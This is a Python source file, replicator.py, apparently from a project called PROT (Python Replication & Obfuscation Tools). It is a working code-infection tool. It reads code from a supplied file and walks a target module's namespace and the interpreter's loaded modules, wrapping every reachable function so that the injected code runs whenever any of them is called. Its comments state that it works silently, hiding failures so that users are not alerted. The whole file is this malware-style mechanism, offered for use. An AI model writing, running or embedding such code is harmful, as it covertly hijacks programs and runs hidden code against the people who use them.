"""
PROT - Python Replication & Obfuscation Tools
Python 3.9.13
file replicator.py: code replication logics.
https://github.com/Romansko/PROT/blob/main/prot/replicator.py
"""
import inspect
import sys
import utils
from sys import argv, exit
from os import path


class Replicator:
    """ Replication logics """

    DEF_RECURSE = 4  # 5 is too much...
    FILTER = ['replicator', 'utils', 'prot']

    def __init__(self, recurseLevel=DEF_RECURSE):
        self.ico = None  # injected code
        self.rl = recurseLevel  # recursion level
        self.infected = []
        self.done = False  # replication & infection done.

    def deco(self, func):
        """ Decorate given function with the user's code. """

        def infected(*args):
            # If injected code fails, try to continue not letting the user know
            if self.done:
                _ = utils.execute(self.ico)
            try:
                return func(*args)
            except:
                return None  # Silent execution.

        return infected  # return self function

    def infect(self, obj, rl=0, container=None):
        """ Affect and Evaluate """
        if rl == self.rl or obj is None or inspect.isbuiltin(obj):  # don't mess with builtins
            return
        try:
            if isinstance(obj, dict):
                for key in list(obj.keys()):  # make keys copy. So we can modify the dictionary.
                    self.infect(obj[key], rl + 1, obj)  # infect dictionary objects.
            elif obj.__name__ not in self.FILTER and obj.__name__ not in self.infected:
                self.infected.append(obj)
                if inspect.ismodule(obj):
                    self.infect(obj.__dict__, rl + 1)  # translate to dictionary
                elif inspect.isclass(obj) and obj.__class__ != self.__class__:
                    self.infect(obj.__class__.__dict__, rl + 1)
                elif container and callable(obj):
                    infected_method = self.deco(obj)
                    if isinstance(container, dict) and obj.__name__ in container:
                        container[obj.__name__] = infected_method
        except:
            pass  # Silent Infection.

    def replicate(self, injectedCodeFilepath, namespace):
        """ Replicate targetCode with injectedCode. """
        if not namespace or not injectedCodeFilepath:
            print("[!] Invalid arguments.")
            return False
        co = utils.extractCodeObject(injectedCodeFilepath)
        if not co:
            return False
        self.ico = co
        self.done = False
        self.infected = []
        self.infect(namespace)
        print("[*] Infection Done.")
        self.done = True
        return True


class FileReplicator(Replicator):
    def __init__(self, recurseLevel=Replicator.DEF_RECURSE):
        super().__init__(recurseLevel)

    def replicate(self, injectedCodeFilepath, filepath):
        """
        Load a target file, replicate user's code within callable object.
        """
        if not filepath or not injectedCodeFilepath:
            print("[!] Invalid arguments.")
            return False
        pfh = utils.PythonFileHandler()
        if not pfh.open(filepath):
            return None
        code = pfh.read()
        pfh.close()
        if not code:
            return False
        namespace = utils.execute(code)
        if not namespace:
            return False
        _ = super().replicate(injectedCodeFilepath, namespace)
        _ = super().replicate(injectedCodeFilepath, sys.modules)
        _ = utils.execute(code)
        return True


def replicate(injectedCodeFilepath, targetFile=None):
    """ entry function """
    if targetFile:
        replicator = FileReplicator()
        arg2 = targetFile
    else:
        replicator = Replicator()
        arg2 = sys.modules
    if not replicator.replicate(injectedCodeFilepath, arg2):
        print("[!] Replication failed!")


if __name__ == '__main__':
    if not argv or len(argv) < 2:
        exit(f"[!] Usage: python {path.basename(__file__)} <injected_code.py> <target_file.py>")
    elif len(argv) == 2:
        replicate(argv[1])
    else:
        replicate(argv[1], argv[2])
